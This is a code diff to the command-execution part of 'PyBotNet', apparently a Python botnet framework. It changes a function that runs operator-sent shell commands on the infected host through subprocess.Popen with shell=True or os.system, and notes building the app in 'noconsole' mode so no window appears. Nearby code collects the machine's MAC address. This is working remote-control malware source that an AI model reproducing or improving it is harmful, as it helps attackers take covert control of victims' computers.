@@ -1,10 +1,10 @@
 '''Defult PyBotNet scripts'''
 import re
 import os
+import subprocess
 
 from logging import exception
 from time import sleep
-from subprocess import check_output
 
 from uuid import getnode as get_system_mac_addres
 from requests import get
@@ -129,7 +129,8 @@ def get_info(pybotnet_up_time, logger):
 def execute_cmd(command, is_shell: bool, logger) -> str:
     try:
         command = split_command(command)
-        command = ' '.join(command[1:])
+        # command = ' '.join(command[1:])
+        command = command[1:]
 
     except exception as error:
         return f'execute_cmd invalid command; Wrong format: {error}'
@@ -143,18 +144,59 @@ def execute_cmd(command, is_shell: bool, logger) -> str:
         return f'cmd error: {error}'
 
 
-def cmd(command: str, is_shell: bool,  logger) -> str:
-    '''command sample: makedir newfolder'''
-    # TODO: add timeout
+# def cmd(command: list, is_shell: bool,  logger) -> str:
+#     '''command sample: makedir newfolder'''
+#     # TODO: add timeout
+
+#     logger.info(f'try to run: {command}')
+
+#     output = subprocess.run(command, shell=True, capture_output=True)
+
+    # output = str(output).replace('\\r\\n', '\n')  # cleaning data
+    # output = str(output).replace('\\n', '\n')
+#     output = str(output).replace("b'", '')
+    # output = output[2:]  # remove b'
+#     return output
+
+def clean_shell_data(output):
+    output = str(output).replace('\\r\\n', '\n')  # cleaning data
+    output = str(output).replace('\\n', '\n')
+    output = str(output).replace("b'", '')
+    return output
+
+
+def cmd(command: list, is_shell: bool, logger):
+    '''if you compile app on noconsloe mod make is_shell False'''
 
     logger.info(f'try to run: {command}')
 
-    output = check_output(command, shell=is_shell)
+    outputFileName = 'data.txt'
 
-    output = str(output).replace('\\r\\n', '\n')  # cleaning data
-    output = str(output).replace('\\n', '\n')
-    output = output[2:]  # remove b'
-    return output
+    if not is_shell:
+
+        os_result = os.system(' '.join(command))
+        return f'''output code {os_result} \n\nyou compile app noconsole (is_shell = False), That\'s why I can\'t get the output text by `cmd` command
+        (for get directory list use `ls` command, like : `ls /home`)'''
+
+        # # this a bug (if compile code on noconsole i can get stdout ..):
+        # with open(outputFileName, "w") as outputFile:
+        #     result = subprocess.call(
+        #         command, shell=True, stdout=outputFile, stderr=subprocess.STDOUT)
+
+        # with open(outputFileName, "r") as outputFile:
+        #     file_data = outputFile.readlines()
+        #     result = f'{file_data} \n\nreturn code {result}'
+        #     outputFile.close()
+        # os.remove(outputFileName)
+        # return clean_shell_data(result)
+
+    else:
+        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
+                                stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+        proc.stdin.close()
+        proc.wait()
+        result = f'{proc.stdout.read()}\n\nreturn code {proc.returncode}'
+        return clean_shell_data(result)
 
 
 def execute_ls(command, logger) -> str:
